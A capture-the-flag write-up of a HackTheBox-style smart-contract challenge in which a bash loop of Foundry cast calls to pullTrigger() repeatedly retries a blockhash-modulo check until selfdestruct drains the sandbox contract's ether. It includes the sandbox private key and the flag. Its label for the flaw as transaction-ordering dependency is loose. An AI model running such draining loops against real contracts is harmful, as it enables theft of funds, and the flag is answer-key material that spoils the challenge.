# Russian Roulette

## Challenge Description

Welcome to The Fray. This is a warm-up to test if you have what it takes to tackle the challenges of the realm. Are you brave enough?

***

## Solution

## Information Gathering

First I started the target instance, I got a single target with two open ports. To what services run on these ports, I decided to run an nmap scan on the ports that are given.

```bash
nmap -A -T4 -p 33484,41124 83.136.255.150
```

From the results of `nmap`, we can see that port 33484 is sandbox environment where the contract server is running.

<figure><img src="../../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

On port 41124, the challenge handler which is a RPC service is running.

<figure><img src="../../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>

First I connected to the challenge handler, to get more information about the contract.

<figure><img src="../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

From the challenge handler, I got the following information:

```textile
Private key     :  0x6ca30395d6012c9c71f1f24ba95029cf2f59ff7d1ad62eddd17aece6d23799fa
Address         :  0x813Cd33aed3364b6791a326DCc94a0dd0cB1e0Db
Target contract :  0x8e2D890BfA477640328910d7C1E6168854FcCBCa
Setup contract  :  0xB2c469e6625263727d00aFa7fe29206568C41aaf
```

## Code Analysis

Download the given file and extract it.

### Setup.sol

This file sets up the contract. To solve this challenge, we have to get the balance of the  target wallet to 0. Initially we have around 10 ether we have to bring it to 0 ether.

```solidity
// Setup.sol
pragma solidity 0.8.23;

import {RussianRoulette} from "./RussianRoulette.sol";

contract Setup {
    RussianRoulette public immutable TARGET;

    constructor() payable {
        TARGET = new RussianRoulette{value: 10 ether}();
    }

    function isSolved() public view returns (bool) {
        return address(TARGET).balance == 0;
    }
}
```



### RussianRoulette.sol

This is the contract that we have to exploit. The code that we need to exploit is inside the `pullTrigger()` function. The `selfdestruct()` call will erase the code of the smart contract as well as send the all the ether that is left in the contract to the `msg.sender`. You can learn more about the `selfdestruct()` function here:

{% embed url="https://docs.soliditylang.org/en/v0.8.23/introduction-to-smart-contracts.html#deactivate-and-self-destruct" %}

```solidity
// RussianRoulette.sol
pragma solidity 0.8.23;

contract RussianRoulette {

    constructor() payable {
        // i need more bullets
    }

    function pullTrigger() public returns (string memory) {
        if (uint256(blockhash(block.number - 1)) % 10 == 7) {
            selfdestruct(payable(msg.sender)); // 💀
        } else {
		return "im SAFU ... for now";
	    }
    }
}
```

To invoke the `selfdestruct()` function, the following condition has to be satisfied:

```solidity
uint256(blockhash(block.number - 1)) % 10 == 7
```

The above condition basically takes the previous blocks blockhash and converts it to `uint256` form, then the resultant value undergoes a modulo 10 operation which should result in the value 7.

## The vulnerability

The above mentioned condition can be satisfied by calling the `pullTrigger()` function repeatedly within a short amount of time, which satisfies the above condition.

{% embed url="https://www.immunebytes.com/blog/transaction-ordering-dependency-how-can-it-hamper-a-smart-contract/" %}

## Exploiting the Vulnerability

For interacting with the contract sandbox running on port 33484 in my case, I used Foundry's cast utility. You can install this utility by refering the following docs:

{% embed url="https://book.getfoundry.sh/getting-started/installation" %}

The syntax for interacting with the sandbox environment is as follows. We are trying to invoke the `pullTrigger()` function using the following command.

```bash
cast send <TARGET_CONTRACT> <FUNCTION> --rpc-url {RPC_URL} --private-key <PRIVATE_KEY>
```

```bash
cast send 0x8e2D890BfA477640328910d7C1E6168854FcCBCa 'pullTrigger()' --rpc-url http://83.136.255.150:33484/ --private-key 0x6ca30395d6012c9c71f1f24ba95029cf2f59ff7d1ad62eddd17aece6d23799fa
```

<figure><img src="../../../.gitbook/assets/image (96).png" alt=""><figcaption></figcaption></figure>

We can see that the above command executed successfully.

Now its time to call the `pullTrigger()` function multiple times in a short amount of time. For that i have created a for loop with bash, to execute the above command multiple times.

```bash
for _ in {0..10}; do cast send 0x8e2D890BfA477640328910d7C1E6168854FcCBCa 'pullTrigger()' --rpc-url http://83.136.255.150:33484/ --private-key 0x6ca30395d6012c9c71f1f24ba95029cf2f59ff7d1ad62eddd17aece6d23799fa; done
```

After executing the above command, You can get the flag from the RPC service.

<figure><img src="../../../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>

Flag: `HTB{99%_0f_g4mbl3rs_quit_b4_bigwin}`
